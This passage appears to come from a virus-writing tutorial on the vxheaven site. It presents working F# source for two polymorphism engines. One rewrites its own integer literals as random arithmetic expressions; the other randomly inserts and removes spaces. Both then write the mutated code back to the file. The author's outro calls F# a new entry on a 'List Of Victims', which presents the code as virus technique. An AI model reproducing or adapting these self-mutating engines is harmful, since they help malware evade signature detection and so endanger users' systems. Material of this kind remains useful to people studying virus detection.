<span style="color: #06c; font-weight: bold;">let</span> isint num<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>num<span style="color: #a52a2a;">&gt;=</span><span style="color: #3cb371;">&quot;0&quot;</span>&amp;&amp;num<span style="color: #a52a2a;">&lt;=</span><span style="color: #3cb371;">&quot;9&quot;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">true</span> <span style="color: #06c; font-weight: bold;">else</span> false<span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> makedif num <span style="color: #a52a2a;">=</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> rn<span style="color: #a52a2a;">=</span>rand.<span style="color: #060;">Next</span><span style="color: black;">&#40;</span>num<span style="color: black;">&#41;</span><span style="color: #a52a2a;">+</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> rr<span style="color: #a52a2a;">=</span>rand.<span style="color: #060;">Next</span><span style="color: black;">&#40;</span><span style="color: #c6c;">3</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> rr<span style="color: #a52a2a;">=</span><span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; r<span style="color: #a52a2a;">:=</span>num<span style="color: #a52a2a;">-</span>rn<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; s<span style="color: #a52a2a;">:=</span><span style="color: #3cb371;">&quot;+&quot;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> rr<span style="color: #a52a2a;">=</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; r<span style="color: #a52a2a;">:=</span>num<span style="color: #a52a2a;">+</span>rn<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; s<span style="color: #a52a2a;">:=</span><span style="color: #3cb371;">&quot;-&quot;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> rr<span style="color: #a52a2a;">=</span><span style="color: #c6c;">2</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; r<span style="color: #a52a2a;">:=</span>num<span style="color: #a52a2a;">*</span>rn<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; s<span style="color: #a52a2a;">:=</span><span style="color: #3cb371;">&quot;/&quot;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #3cb371;">&quot;(&quot;</span>^System.<span style="color: #060;">Convert</span>.<span style="color: #060;">ToString</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>r<span style="color: black;">&#41;</span>^ <span style="color: #a52a2a;">!</span>s^System.<span style="color: #060;">Convert</span>.<span style="color: #060;">ToString</span><span style="color: black;">&#40;</span>rn<span style="color: black;">&#41;</span>^<span style="color: #3cb371;">&quot;)&quot;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">for</span> i<span style="color: #a52a2a;">=</span><span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">to</span> vcode.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; l<span style="color: #a52a2a;">:=</span><span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; changeval<span style="color: #a52a2a;">:=</span>false<span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c<span style="color: #a52a2a;">&lt;</span>vcode.<span style="color: #060;">Length</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; nstr<span style="color: #a52a2a;">:=</span>vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c,<span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>isint<span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>nstr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; nstr<span style="color: #a52a2a;">:=</span><span style="color: #3cb371;">&quot;&quot;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">while</span> <span style="color: black;">&#40;</span>isint<span style="color: black;">&#40;</span>vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c,<span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; nstr<span style="color: #a52a2a;">:=!</span>nstr^vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c,<span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; c<span style="color: #a52a2a;">:=!</span>c<span style="color: #a52a2a;">+</span><span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; l<span style="color: #a52a2a;">:=!</span>l<span style="color: #a52a2a;">+</span><span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; done<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; c<span style="color: #a52a2a;">:=!</span>c<span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c<span style="color: #a52a2a;">-</span><span style="color: #c6c;">6</span>,<span style="color: #c6c;">5</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">&lt;&gt;</span><span style="color: #3cb371;">&quot;ToInt&quot;</span>&amp;&amp;vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c<span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span>,<span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">&lt;&gt;</span><span style="color: #3cb371;">&quot;<span style="">\u</span>0022&quot;</span>&amp;&amp; <span style="color: #a52a2a;">!</span>nstr<span style="color: #a52a2a;">&lt;&gt;</span><span style="color: #3cb371;">&quot;0022&quot;</span>&amp;&amp;rand.<span style="color: #060;">Next</span><span style="color: black;">&#40;</span><span style="color: #c6c;">3</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">&lt;&gt;</span><span style="color: #c6c;">0</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; changeval<span style="color: #a52a2a;">:=</span>true<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>c<span style="color: black;">&#41;</span><span style="color: #a52a2a;">&lt;</span>vcode.<span style="color: #060;">Length</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: #a52a2a;">!</span>changeval <span style="color: #06c; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color: #a52a2a;">:=!</span>newcode^makedif<span style="color: black;">&#40;</span>System.<span style="color: #060;">Convert</span>.<span style="color: #060;">ToInt32</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>nstr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">else</span><br/>
&nbsp; &nbsp; &nbsp; newcode<span style="color: #a52a2a;">:=!</span>newcode^ <span style="color: #a52a2a;">!</span>nstr<br/>
&nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; c<span style="color: #a52a2a;">:=!</span>c<span style="color: #a52a2a;">+</span><span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
done<span style="color: #a52a2a;">;</span><br/>
vf.<span style="color: #060;">Write</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>newcode<span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
vf.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;</div>
<ul>
<li>First it searchs its own code.</li>
<li>It prepares all variables</li>
<li>It creates two sub-functions, for checking if a string is a number and for create the representating calculation of a number</li>
<li>It goes throu the code and searchs all integer numbers</li>
<li>If the number is not part of "ToInt32"-method, if it is not '"', if it is not a unicode and if rand.Next(3) is not zero, it changes the number</li>
<li>It writes the new code to the file.</li>
</ul>
<h3><a name="c22"></a>Space Games</h3>
<p>This kind of polymorphism uses the fact, that F# ignores multible spaces. That means a command like this one:</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #06c; font-weight: bold;">let</span> a <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;</div>
<p>is the same as</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; <span style="color: #06c; font-weight: bold;">let</span> &nbsp; a &nbsp; &nbsp; <span style="color: #a52a2a;">=</span> &nbsp; <span style="color: #06c; font-weight: bold;">ref</span> &nbsp; <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;</div>
<p>The code randomly adds and removes spaces from the code. It is quite simple, but again you can easiely see the princip of functionality (in function istrue).</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #06c; font-weight: bold;">open</span> System.<span style="color: #060;">IO</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> vfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> vcode <span style="color: #a52a2a;">=</span> vfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;vfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> vf <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamWriter<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> a <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span> <span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> newcode<span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #3cb371;">&quot;o&quot;</span> <span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> rand <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> System.<span style="color: #060;">Random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">let</span> istrue num <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">if</span> num<span style="color: #a52a2a;">=</span><span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">false</span> <span style="color: #06c; font-weight: bold;">else</span> true<span style="color: #a52a2a;">;;</span><br/>
&nbsp;<span style="color: #06c; font-weight: bold;">for</span> i <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">to</span> vcode.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; &nbsp;a <span style="color: #a52a2a;">:=</span> <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp;<span style="color: #06c; font-weight: bold;">if</span><span style="color: black;">&#40;</span>vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span> i <span style="color: #a52a2a;">-</span> <span style="color: #c6c;">1</span> , <span style="color: #c6c;">2</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">=</span><span style="color: #3cb371;">&quot;<span style="">\u</span>0020<span style="">\u</span>0020&quot;</span> &amp;&amp; istrue<span style="color: black;">&#40;</span>rand.<span style="color: #060;">Next</span><span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp;newcode <span style="color: #a52a2a;">:=</span> <span style="color: #a52a2a;">!</span>newcode^<span style="color: #3cb371;">&quot;<span style="">\u</span>0020&quot;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp;<span style="color: #06c; font-weight: bold;">let</span> i <span style="color: #a52a2a;">=</span> i <span style="color: #a52a2a;">+</span> <span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; &nbsp;a <span style="color: #a52a2a;">:=</span> <span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp;end<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp;<span style="color: #06c; font-weight: bold;">if</span><span style="color: black;">&#40;</span>vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span> i , <span style="color: #c6c;">1</span><span style="color: black;">&#41;</span> <span style="color: #a52a2a;">=</span> <span style="color: #3cb371;">&quot;<span style="">\u</span>0020&quot;</span> &amp;&amp; istrue<span style="color: black;">&#40;</span>rand.<span style="color: #060;">Next</span><span style="color: black;">&#40;</span><span style="color: #c6c;">2</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp;newcode <span style="color: #a52a2a;">:=</span> <span style="color: #a52a2a;">!</span>newcode^<span style="color: #3cb371;">&quot;<span style="">\u</span>0020<span style="">\u</span>0020&quot;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp;a <span style="color: #a52a2a;">:=</span> <span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp;end<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp;<span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>a <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">0</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp;newcode <span style="color: #a52a2a;">:=</span> <span style="color: #a52a2a;">!</span>newcode ^ vcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span> i , <span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp;end<span style="color: #a52a2a;">;</span><br/>
&nbsp;done<span style="color: #a52a2a;">;</span><br/>
&nbsp;vf.<span style="color: #060;">Write</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>newcode<span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;vf.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
&nbsp;</div>
<ul>
<li>First it searchs its own code.</li>
<li>It checks every single character of the code.</li>
<li>If it's "\u0020" (Unicode: Space): 2/3 it adds another space</li>
<li>If it's "\u0020\u0020" (Unicode: double Space): 1/3 it removes a space</li>
<li>If no Space: add normal character to newcode</li>
<li>Write newcode to file</li>
</ul>
<h2><a name="c3"></a>Outro Words</h2>
<p>Another file extention has been added to my "List Of Victims" - and especially about this one I'm really really happy. I proved myself that I can do everything I want. I'm also very happy that I can stop working with that language now - to be honest, I hate it - I nearly got crazy when I coded in that language, without success first (and not that usual 'crazy' - but the real crazy). Well, I will never do anything related to that language - trust me ;)</p>
[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp30">Back to index</a>] [<a href="/lib/vsp30.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp30">de</a><a href="/lib/index.php?lang=en&amp;id=vsp30">en</a><a href="/lib/index.php?lang=es&amp;id=vsp30">es</a><a href="/lib/index.php?lang=it&amp;id=vsp30">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp30">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp30">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp30">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp30">ua</a></div>
</body>
</html>
